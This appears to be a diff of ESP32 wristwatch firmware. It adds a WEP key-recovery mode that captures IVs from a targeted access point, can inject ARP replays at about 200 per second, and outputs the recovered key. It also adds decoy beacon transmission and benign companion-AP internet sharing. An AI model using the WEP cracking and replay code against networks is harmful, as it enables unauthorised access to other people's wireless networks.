+                s_wep_state = NOCSIF_WEP_RECOVERED;
+                ESP_LOGW(TAG, "wep: RECOVERED %d-bit key after %u unique IVs", klen * 8, (unsigned)u);
+                break;
+            }
+            next_try = u + 20000u;                          /* try again as more IVs come in */
+        }
+        vTaskDelay(pdMS_TO_TICKS(250));
+    }
+
+    wep_recover_ctx_free(&ctx);
+    s_wep_task = NULL;
+    vTaskDeleteWithCaps(NULL);
+}
+
+static void do_wep_on(const uint8_t bssid[6], int channel, int key_len, const char *ssid)
+{
+    if (s_wep_active) return;
+    if (s_wep_task != NULL) { ESP_LOGW(TAG, "wep: previous worker still exiting — retry"); return; }
+    if (nocsif_reliability_safe_mode()) { s_wep_state = NOCSIF_WEP_FAILED; return; }
+
+    memcpy(s_wep_bssid, bssid, 6);
+    snprintf(s_wep_ssid, sizeof s_wep_ssid, "%s", ssid ? ssid : "");
+    s_wep_cfg_keylen = (key_len == WEP_KEY40_LEN || key_len == WEP_KEY104_LEN) ? key_len : 0;
+    int ch = (channel >= 1 && channel <= 13) ? channel : 1;
+
+    s_wep_data_frames = s_wep_unique = s_wep_replays = 0;
+    s_wep_progress = 0; s_wep_arp_len = 0; s_wep_key_bytes = 0;
+    s_wep_key_hex[0] = s_wep_key_ascii[0] = '\0';
+    s_wep_ring_head = s_wep_ring_tail = s_wep_ring_drop = 0;
+
+    if (s_wep_ring == NULL) {                               /* SPSC sample ring, held for the session */
+        s_wep_ring = heap_caps_malloc(sizeof(wep_samp_t) * WEP_RING_SLOTS, MALLOC_CAP_SPIRAM);
+        if (s_wep_ring == NULL) { ESP_LOGE(TAG, "wep: sample-ring alloc failed"); s_wep_state = NOCSIF_WEP_FAILED; return; }
+    }
+
+    do_parse_on();                                         /* capture + parser (drops any STA link) */
+    if (!s_mon_active && !s_pending_monitor) {
+        ESP_LOGW(TAG, "wep: capture did not start");
+        s_wep_state = NOCSIF_WEP_FAILED;
+        return;
+    }
+    do_mon_chan(ch);                                       /* hold the target's channel */
+
+    s_wep_state  = NOCSIF_WEP_COLLECTING;
+    s_wep_active = true;                                   /* arms parse_wep + the fuller WEP snaplen */
+    if (xTaskCreateWithCaps(wep_worker_task, "wifiwep", 32768, NULL, 2, &s_wep_task, MALLOC_CAP_SPIRAM) != pdPASS) {
+        ESP_LOGE(TAG, "wep: worker task create failed");
+        s_wep_active = false;
+        s_wep_state  = NOCSIF_WEP_FAILED;
+        return;
+    }
+    if (s_wep_replay) {                                    /* interactive ARP replay accelerator */
+        if (s_wep_replay_timer == NULL) {
+            const esp_timer_create_args_t a = { .callback = wep_replay_fire, .name = "wifiwepreplay" };
+            esp_timer_create(&a, &s_wep_replay_timer);
+        }
+        if (s_wep_replay_timer) esp_timer_start_periodic(s_wep_replay_timer, 5000);   /* 5 ms → ~200/s */
+    }
+    ESP_LOGW(TAG, "wep: recovery ON -> %02x:%02x:%02x:%02x:%02x:%02x ch %d keylen %d replay %d",
+             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ch, s_wep_cfg_keylen, (int)s_wep_replay);
+}
+
+static void do_wep_off(void)
+{
+    if (s_wep_replay_timer) esp_timer_stop(s_wep_replay_timer);
+    if (!s_wep_active) return;
+    s_wep_active = false;                                   /* worker loop exits, frees its ctx, self-deletes */
+    if (s_wep_state == NOCSIF_WEP_COLLECTING) s_wep_state = NOCSIF_WEP_IDLE;
+    ESP_LOGI(TAG, "wep: recovery OFF (%u IVs, %u replays, %u frames)",
+             (unsigned)s_wep_unique, (unsigned)s_wep_replays, (unsigned)s_wep_data_frames);
+}
+
+/* ---- beacon TX (M5-P5·2, active — authorized testing) ------------------------------- *
+ * Advertises N decoy networks by transmitting beacon frames, each with a distinct
+ * locally-administered BSSID and a generated "NocSif-NN" SSID (deliberately our own name — it does
+ * not impersonate a real network). Reuses the P5·1 raw-TX override. */
 
 /* A deterministic, unique locally-administered BSSID per decoy index (02:4E:6F:63:hi:lo). */
 static void beacon_bssid(uint8_t out[6], int idx)
@@ -3737,8 +4036,9 @@ static void ap_teardown(void)
     if (!s_ap_active) {
         return;
     }
-    companion_stop();                                 /* section 4.8a: the companion surface rides on the AP too */
-    portal_stop();                                    /* the portal rides on the AP as well: drop it first */
+    companion_napt_apply(false);                      /* §4.8a: drop any companion internet sharing first */
+    companion_stop();                                 /* §4.8a: the companion surface rides on the AP too */
+    portal_stop();                                    /* the portal rides on the AP — drop it first */
     if (s_ap_timer) {
         esp_timer_stop(s_ap_timer);
     }
@@ -4548,8 +4848,18 @@ void nocsif_wifi_companion_publish_thumb(const uint8_t *rgb565_le, int w, int h)
 
 static esp_err_t comp_ws_handler(httpd_req_t *req)
 {
-    if (req->method == HTTP_GET) {                 /* the handshake is done: start tracking this socket for pushes */
-        ws_add_fd(httpd_req_to_sockfd(req));
+    if (req->method == HTTP_GET) {                 /* handshake done → track this socket for pushes */
+        int fd = httpd_req_to_sockfd(req);
+        ws_add_fd(fd);
+        /* Mirror QoS (internet-sharing): mark this socket's TX at a high WMM access category so the
+         * watch→phone mirror frames beat best-effort forwarded internet in the SoftAP's TX queues. With
+         * sharing on, a bulk internet downlink otherwise starves the interactive mirror — the picture on
+         * the phone lags badly even though the watch itself responds to the touch uplink promptly (the
+         * frames just can't get airtime). NAPT preserves the internet packets' own DSCP (best-effort), so
+         * elevating only this socket makes the mirror win. DSCP CS5 (0xA0) → TID 5 → AC_VI (video) in the
+         * WiFi driver's DSCP→AC map; AC_VI beats AC_BE without the strict-airtime penalties of AC_VO. */
+        int tos = 0xA0;
+        setsockopt(fd, IPPROTO_IP, IP_TOS, &tos, sizeof tos);
         return ESP_OK;
     }
     /* Interactive uplink, phone to watch: small JSON control messages on
@@ -5064,6 +5374,176 @@ static void companion_stop(void)
     ESP_LOGI(TAG, "companion surface stopped");
 }
 
+/* §4.8a companion internet sharing — the travel-router recipe from gateway.c (ap_up + napt_apply),
+ * scoped to the companion AP. Unlike do_ap_on() (a pure software AP that tears the STA link down), these
+ * keep the station uplink live so downstream clients can be NAPT-forwarded to the internet. */
+
+/* Enable / disable NAPT on the companion AP netif. Idempotent (tracked by s_comp_napt). With NAPT on,
+ * downstream traffic is forwarded via the default route — the STA uplink when it has an IP, and simply
+ * dropped (no internet) when the link is down, resuming automatically when it returns. */
+static void companion_napt_apply(bool want)
+{
+#if defined(CONFIG_LWIP_IPV4_NAPT)
+    if (want && !s_comp_napt && s_ap_netif) {
+        esp_err_t e = esp_netif_napt_enable(s_ap_netif);
+        s_comp_napt = (e == ESP_OK);
+        if (!s_comp_napt) {
+            ESP_LOGE(TAG, "companion NAPT enable: %s (check LWIP_IP_FORWARD/IPV4_NAPT)", esp_err_to_name(e));
+        } else {
+            ESP_LOGW(TAG, "companion share ON: AP %s -> uplink %s",
+                     s_ap_ip[0] ? s_ap_ip : "?", s_connected ? nocsif_wifi_ip_str() : "(no uplink yet)");
+        }
+    } else if (!want && s_comp_napt) {
+        if (s_ap_netif) {
+            esp_netif_napt_disable(s_ap_netif);
+        }
+        s_comp_napt = false;
+        ESP_LOGI(TAG, "companion share OFF");
+    }
+#else
+    if (want) {
+        ESP_LOGE(TAG, "companion share: NAPT not built — set CONFIG_LWIP_IP_FORWARD=y + "
+                      "CONFIG_LWIP_IPV4_NAPT=y (sdkconfig.defaults)");
+    }
+    (void)want;
+#endif
+}
+
+/* Raise the companion AP in APSTA — KEEP the STA uplink (unlike do_ap_on, which drops it) so downstream
+ * clients can share the watch's internet. Reuses the software-AP helpers (bring_up / apply_ap_config /
+ * ap_tick). Returns true once the AP is beaconing. */
+static bool companion_ap_up(void)
+{
+    if (nocsif_reliability_safe_mode()) {
+        return false;
+    }
+    if (!bring_up()) {                                    /* esp_wifi_init (lean/gw profile) + STA netif */
+        return false;
+    }
+    ap_cfg_ensure_loaded();
+
+    /* Arm the STA connect so APSTA has an uplink to share: if a network is saved and auto-join is on and
+     * we're not already linked, set the connect intent + creds BEFORE start (so a cold STA_START connects
+     * on its own via try_connect), then kick it if the STA is already started. A live link is left exactly
+     * as it is — the companion NEVER disconnects the station (that is the whole point of this feature). */
+    if (!s_connected && s_ssid[0] && s_autojoin) {
+        s_want_connect = true;
+        s_retry = 0;
+        s_auth_fail = false;
+        s_join_state = NOCSIF_WIFI_JOIN_JOINING;
+        apply_config();
+    }
+    ensure_started();
+    if (s_want_connect && !s_connected && s_sta_started) {
+        try_connect();
+    }
+
+    if (s_ap_netif == NULL) {
+        s_ap_netif = esp_netif_create_default_wifi_ap();  /* default AP netif = built-in DHCP server */
+        if (s_ap_netif == NULL) {
+            ESP_LOGE(TAG, "companion: create_default_wifi_ap failed");
+            publish_status("err");
+            publish_detail("AP init failed.");
+            return false;
+        }
+    }
+
+    /* APSTA: the STA stays associated while the AP is added on the ONE radio. The AP must share the STA's
+     * channel — a single radio can't split channels — so force it to match when a link is up. */
+    if (esp_wifi_set_mode(WIFI_MODE_APSTA) != ESP_OK) {
+        ESP_LOGE(TAG, "companion: set_mode(APSTA) failed");
+        publish_status("err");
+        publish_detail("AP mode failed.");
+        return false;
+    }
+    apply_ap_config();                                    /* companion SSID/pass via s_ap_ssid_ov/_pass_ov */
+    {
+        uint8_t pri = 0; wifi_second_chan_t sec;
+        if (s_connected && esp_wifi_get_channel(&pri, &sec) == ESP_OK && pri) {
+            wifi_config_t wc;
+            if (esp_wifi_get_config(WIFI_IF_AP, &wc) == ESP_OK && wc.ap.channel != pri) {
+                wc.ap.channel = pri;                      /* follow the STA (else APSTA is refused) */
+                ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_config(WIFI_IF_AP, &wc));
+            }
+        }
+    }
+
+    /* Hand downstream clients a resolver they can actually reach THROUGH NAPT: the STA's own upstream DNS
+     * when known, else a public fallback. The companion has no local resolver (unlike the gateway), so
+     * offering the AP's own IP would leave clients "connected, no internet" (name lookups would fail even
+     * though NAPT routes raw IP traffic fine). The DHCP option can only change while dhcps is stopped. */
+    esp_netif_ip_info_t ipi;
+    if (esp_netif_get_ip_info(s_ap_netif, &ipi) == ESP_OK) {
+        snprintf(s_ap_ip, sizeof s_ap_ip, IPSTR, IP2STR(&ipi.ip));
+        esp_netif_dns_info_t dns = { 0 };
+        dns.ip.type = ESP_IPADDR_TYPE_V4;
+        esp_netif_dns_info_t sta_dns;
+        if (s_netif && esp_netif_get_dns_info(s_netif, ESP_NETIF_DNS_MAIN, &sta_dns) == ESP_OK &&
+            sta_dns.ip.u_addr.ip4.addr != 0) {
+            dns.ip.u_addr.ip4.addr = sta_dns.ip.u_addr.ip4.addr;   /* the uplink's own resolver */
+        } else {
+            esp_ip4_addr_t fb; esp_netif_str_to_ip4("1.1.1.1", &fb);
+            dns.ip.u_addr.ip4.addr = fb.addr;                      /* public fallback, reached via NAPT */
+        }
+        esp_netif_dhcps_stop(s_ap_netif);
+        esp_netif_set_dns_info(s_ap_netif, ESP_NETIF_DNS_MAIN, &dns);
+        uint8_t offer_dns = 2;                            /* OFFER_DNS (dhcps_offer_t) */
+        esp_netif_dhcps_option(s_ap_netif, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
+                               &offer_dns, sizeof offer_dns);
+        esp_netif_dhcps_start(s_ap_netif);
+    }
+
+    s_ap_cli_cnt[0] = s_ap_cli_cnt[1] = 0;                /* start with an empty client list */
+    s_ap_cli_i = 0;
+    s_ap_cli_gen++;
+    if (s_ap_timer == NULL) {
+        const esp_timer_create_args_t ta = { .callback = ap_tick, .name = "wifiap" };
+        ESP_ERROR_CHECK_WITHOUT_ABORT(esp_timer_create(&ta, &s_ap_timer));
+    }
+    if (s_ap_timer) {
+        esp_timer_start_periodic(s_ap_timer, 750000);     /* 750 ms client-list refresh */
+    }
+
+    s_ap_active = true;
+    s_enabled = true;
+
+    /* NAPT: forward downstream clients to the uplink (a no-op route until the STA has an IP). */
+    companion_napt_apply(s_comp_share_want);
+
+    uint8_t apmac[6];                                     /* AP MAC in the readout while it owns the radio */
+    if (esp_wifi_get_mac(WIFI_IF_AP, apmac) == ESP_OK) {
+        char s[18]; format_mac(s, sizeof s, apmac); publish_mac_str(s);
+    }
+    ESP_LOGW(TAG, "companion AP up (APSTA): \"%s\" ip %s share=%d uplink=%s; int-dma free=%u largest=%u",
+             s_ap_ssid_ov[0] ? s_ap_ssid_ov : s_ap_ssid, s_ap_ip[0] ? s_ap_ip : "?",
+             (int)s_comp_share_want, s_connected ? nocsif_wifi_ip_str() : "(none)",
+             (unsigned)nocsif_int_dma_free(), (unsigned)nocsif_int_dma_largest());
+    refresh_strings();
+    return true;
+}
+
+/* Drop the companion AP but KEEP the STA uplink (the APSTA counterpart of do_ap_off, which instead tears
+ * STA down and rejoins). NAPT off, back to STA-only mode; the station link is never touched. */
+static void companion_ap_down(void)
+{
+    if (!s_ap_active) {
+        return;
+    }
+    companion_napt_apply(false);
+    if (s_ap_timer) {
+        esp_timer_stop(s_ap_timer);
+    }
+    s_ap_active = false;
+    s_ap_cli_cnt[0] = s_ap_cli_cnt[1] = 0;
+    s_ap_cli_i = 0;
+    s_ap_cli_gen++;
+    s_ap_ip[0] = '\0';
+    esp_wifi_set_mode(WIFI_MODE_STA);                     /* drop the AP, keep the uplink (gateway ap_down) */
+    publish_current_mac();                                /* STA MAC back in the readout */
+    ESP_LOGI(TAG, "companion AP down (STA link kept)");
+    refresh_strings();
+}
+
 static void do_companion_on(void)
 {
     if (s_comp_active) {
@@ -5088,15 +5568,15 @@ static void do_companion_on(void)
 
     comp_ssid_build();
 
-    /* Stages the companion SSID and optional WPA2 password, then reuses
-     * the already-shipped AP bring-up. A password shorter than 8 characters
-     * (WPA2's minimum) is treated as none, meaning open, so a stray short
-     * value can never brick the join. */
+    /* Stage the companion SSID + optional WPA2 password, then raise the AP in APSTA (keeping the STA
+     * uplink so the mirror phone can share the watch's internet). A password of < 8 chars (WPA2's
+     * minimum) is treated as none → OPEN, so a stray short value can't brick join. */
     snprintf(s_ap_ssid_ov, sizeof s_ap_ssid_ov, "%s", s_comp_ssid);
     nocsif_settings_get_str(K_COMP_PW, s_ap_pass_ov, sizeof s_ap_pass_ov, "");
     if (strlen(s_ap_pass_ov) < 8) s_ap_pass_ov[0] = '\0';
-    do_ap_on();
-    if (!s_ap_active) {                               /* the AP failed to come up: roll the override back */
+    s_comp_share_want = nocsif_settings_get_i32(K_COMP_SHARE, 1) != 0;  /* internet sharing (default on) */
+    companion_ap_up();
+    if (!s_ap_active) {                               /* AP failed -> roll the override back */
         s_ap_ssid_ov[0] = '\0';
         s_ap_pass_ov[0] = '\0';
         publish_status("err");
@@ -5111,7 +5591,7 @@ static void do_companion_on(void)
         bool owned = s_comp_owns_ap;
         companion_stop();                             /* mDNS is down; clear the overrides too, since httpd is already null */
         if (owned) {
-            do_ap_off();
+            companion_ap_down();                      /* AP down, STA uplink kept */
         }
         publish_status("err");
         publish_detail("Companion HTTP failed to start.");
@@ -5131,7 +5611,7 @@ static void do_companion_off(void)
     bool owned = s_comp_owns_ap;
     companion_stop();                                 /* drops HTTP and mDNS, clears the overrides */
     if (owned) {
-        do_ap_off();                                  /* tears the AP down and restores the previous STA link */
+        companion_ap_down();                          /* AP down, STA uplink kept (never dropped) */
     }
     refresh_strings();
 }
@@ -5146,15 +5626,42 @@ int         nocsif_wifi_companion_clients(void) { return s_comp_active ? nocsif_
 
 const char *nocsif_wifi_companion_status_str(void)
 {
-    static char s[80];
+    static char s[96];
     if (s_comp_active) {
         int c = nocsif_wifi_ap_client_count();
-        snprintf(s, sizeof s, "on \xC2\xB7 %s \xC2\xB7 %d client%s",
-                 nocsif_wifi_companion_url(), c, c == 1 ? "" : "s");
+        /* Reflect internet sharing: "sharing" once NAPT is live with an uplink, "no uplink" when share is
+         * on but the watch itself has no link (nothing to share), else just the client count. */
+        const char *net = !s_comp_share_want ? "" :
+                          (s_comp_napt && s_connected) ? " \xC2\xB7 sharing internet" : " \xC2\xB7 no uplink";
+        snprintf(s, sizeof s, "on \xC2\xB7 %s \xC2\xB7 %d client%s%s",
+                 nocsif_wifi_companion_url(), c, c == 1 ? "" : "s", net);
     } else {
         snprintf(s, sizeof s, "off \xC2\xB7 tap Start");
     }
     return s;
+}
+
+/* ---- §4.8a companion internet sharing (public API) --------------------------------------- */
+void nocsif_wifi_companion_set_share(bool on)
+{
+    nocsif_settings_set_i32(K_COMP_SHARE, on ? 1 : 0);   /* persist on the CALLER's task (never an ISR) */
+    s_comp_share_want = on;
+    if (s_q) {                                           /* apply live if the companion is up */
+        wifi_cmd_t c = { .type = CMD_COMPANION_SHARE, .arg = on ? 1 : 0 };
+        xQueueSend(s_q, &c, 0);
+    }
+}
+
+bool nocsif_wifi_companion_share_wanted(void)
+{
+    static bool loaded;                                  /* prime the RAM cache from NVS once for the UI */
+    if (!loaded) { s_comp_share_want = nocsif_settings_get_i32(K_COMP_SHARE, 1) != 0; loaded = true; }
+    return s_comp_share_want;
+}
+
+bool nocsif_wifi_companion_sharing(void)
+{
+    return s_comp_active && s_comp_napt && s_connected;  /* actually forwarding downstream to the uplink */
 }
 
 const char *nocsif_wifi_companion_tag_str(void)
@@ -6049,6 +6556,8 @@ static void wifi_task(void *arg)
         case CMD_MGMTTX_ON:     do_mgmt_tx_on(); break;
         case CMD_MGMTTX_OFF:    do_mgmt_tx_off(); break;
         case CMD_MGMTTX_TARGET: do_mgmt_tx_target(c.mac, (int)c.arg, c.ssid); break;
+        case CMD_WEP_ON:        do_wep_on(c.mac, (int)c.arg, (int)c.arg2, c.ssid); break;
+        case CMD_WEP_OFF:       do_wep_off(); do_monitor_off(); break;   /* stop + restore the STA link */
         case CMD_BEACON_ON:     do_beacon_on(); break;
         case CMD_BEACON_OFF:    do_beacon_off(); break;
         case CMD_EXPORT_HC:     do_export_hc(); break;
@@ -6062,6 +6571,11 @@ static void wifi_task(void *arg)
         case CMD_PORTAL_RELOAD: do_portal_reload(); break;
         case CMD_COMPANION_ON:  do_companion_on(); break;
         case CMD_COMPANION_OFF: do_companion_off(); break;
+        case CMD_COMPANION_SHARE:                                    /* §4.8a: toggle internet sharing live */
+            s_comp_share_want = (c.arg != 0);
+            if (s_comp_active && s_ap_active) companion_napt_apply(s_comp_share_want);
+            refresh_strings();
+            break;
         case CMD_LEAN_ON:       do_lean_set(true);  break;
         case CMD_LEAN_OFF:      do_lean_set(false); break;
         case CMD_GEO_STAMP:     do_geo_stamp(c.arg, c.arg2); break;   /* §4.6 P3 */
@@ -6121,6 +6635,79 @@ static void post_i(wifi_cmd_type_t type, int32_t arg)
     }
     wifi_cmd_t c = { .type = type, .arg = arg };
     xQueueSend(s_q, &c, 0);
+}
+
+/* ---- #4 WEP key recovery public API ------------------------------------------------- */
+void nocsif_wifi_request_wep_recover(const uint8_t bssid[6], int channel, int key_len,
+                                     const char *ssid, bool on)
+{
+    if (!on) { post(CMD_WEP_OFF, NULL, NULL); return; }
+    if (s_q == NULL || bssid == NULL) return;
+    wifi_cmd_t c = { .type = CMD_WEP_ON, .arg = channel, .arg2 = key_len };
+    memcpy(c.mac, bssid, 6);
+    if (ssid) snprintf(c.ssid, sizeof c.ssid, "%s", ssid);
+    xQueueSend(s_q, &c, 0);
+}
+
+void nocsif_wifi_wep_set_replay(bool on)
+{
+    s_wep_replay = on;
+    if (s_wep_replay_timer) {
+        esp_timer_stop(s_wep_replay_timer);                 /* harmless if not running */
+        if (on && s_wep_active) esp_timer_start_periodic(s_wep_replay_timer, 5000);
+    }
+}
+bool     nocsif_wifi_wep_replay(void)      { return s_wep_replay; }
+nocsif_wep_state_t nocsif_wifi_wep_state(void) { return (nocsif_wep_state_t)s_wep_state; }
+uint32_t nocsif_wifi_wep_unique_ivs(void)  { return s_wep_unique; }
+uint8_t  nocsif_wifi_wep_progress(void)    { return s_wep_progress; }
+uint32_t nocsif_wifi_wep_data_frames(void) { return s_wep_data_frames; }
+uint32_t nocsif_wifi_wep_replays(void)     { return s_wep_replays; }
+bool     nocsif_wifi_wep_has_arp(void)     { return s_wep_arp_len > 0; }
+
+int nocsif_wifi_wep_key(uint8_t *out, int max)
+{
+    int n = s_wep_key_bytes;
+    if (n <= 0 || !out) return 0;
+    if (n > max) n = max;
+    memcpy(out, s_wep_key, (size_t)n);
+    return n;
+}
+const char *nocsif_wifi_wep_key_hex(void)   { return s_wep_key_hex; }
+const char *nocsif_wifi_wep_key_ascii(void) { return s_wep_key_ascii; }
+
+const char *nocsif_wifi_wep_status_str(void)
+{
+    static char b[56];
+    switch ((nocsif_wep_state_t)s_wep_state) {
+        case NOCSIF_WEP_RECOVERED:
+            snprintf(b, sizeof b, "recovered %d-bit key", s_wep_key_bytes * 8);
+            break;
+        case NOCSIF_WEP_COLLECTING:
+            snprintf(b, sizeof b, "collecting %u IVs (%u%%)%s",
+                     (unsigned)s_wep_unique, (unsigned)s_wep_progress,
+                     (s_wep_replay && s_wep_arp_len > 0) ? " · replay" : "");
+            break;
+        case NOCSIF_WEP_FAILED: snprintf(b, sizeof b, "could not start"); break;
+        default:                snprintf(b, sizeof b, "idle"); break;
+    }
+    return b;
+}
+const char *nocsif_wifi_wep_target_str(void)
+{
+    static char b[64];
+    snprintf(b, sizeof b, "%s · %02x:%02x:%02x:%02x:%02x:%02x",
+             s_wep_ssid[0] ? s_wep_ssid : "(hidden)",
+             s_wep_bssid[0], s_wep_bssid[1], s_wep_bssid[2], s_wep_bssid[3], s_wep_bssid[4], s_wep_bssid[5]);
+    return b;
+}
+const char *nocsif_wifi_wep_tag_str(void)
+{
+    static char b[16];
+    if (s_wep_state == NOCSIF_WEP_RECOVERED) return "got key";
+    if (!s_wep_active) return "off";
+    snprintf(b, sizeof b, "%u IVs", (unsigned)s_wep_unique);
+    return b;
 }
 
 esp_err_t nocsif_wifi_init(void)
@@ -6186,6 +6773,21 @@ void nocsif_wifi_set_lean(bool lean)
     }
     post(lean ? CMD_LEAN_ON : CMD_LEAN_OFF, NULL, NULL);
 }
+void nocsif_wifi_set_gateway_profile(bool on)
+{
+    /* Boot-time only: main.c arms this before nocsif_wifi_init when share is persisted. The buffer set is
+     * fixed at the single esp_wifi_init, so a request once the driver is up is ignored (a reboot is needed
+     * to apply it — the UI shows that hint). */
+    if (s_driver_up) {
+        ESP_LOGW(TAG, "gateway WiFi profile requested at runtime — ignored (fixed at init; %s this boot)",
+                 s_gw_profile ? "GATEWAY" : "lean");
+        return;
+    }
+    s_gw_profile = on;
+    ESP_LOGI(TAG, "WiFi %s profile armed (applies at the next bring-up)", on ? "GATEWAY throughput" : "lean");
+}
+bool nocsif_wifi_gateway_profile_armed(void)  { return s_gw_profile; }
+uint32_t nocsif_wifi_ntp_gen(void)            { return s_ntp_gen; }
 bool nocsif_wifi_is_lean(void)                { return s_lean; }
 void nocsif_wifi_request_scan(void)           { post(CMD_SCAN, NULL, NULL); }
 void nocsif_wifi_request_connect(const char *ssid, const char *pass)
